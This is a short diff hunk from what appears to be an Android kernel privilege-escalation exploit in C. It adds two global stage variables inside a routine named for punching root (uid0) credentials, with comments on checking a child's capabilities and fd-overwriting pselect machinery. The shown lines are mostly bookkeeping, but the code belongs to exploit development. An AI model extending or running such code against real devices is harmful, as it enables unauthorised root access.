@@ -2228,6 +2228,8 @@ uid0_cred_punch:;
   /* landing-checked retry: the route loop verifies each punch attempt via
    * this child's CapEff (do_pselect_fake_lock_route MODE4_SLIDE_CRED) */
   g_uid0_child_pid = (long)child;
+  g_resurge_stage = env_flag("MODE4_RESURGE", 0) ? 1 : 0;
+  g_resurge_rot = 0;
   unlink("/data/local/tmp/child_uid.txt");
   /* The pselect fdset machinery dup2()s over EVERY fd 0..319 whose bit
    * appears in the stamp words (pointer-valued -> random low bits set).
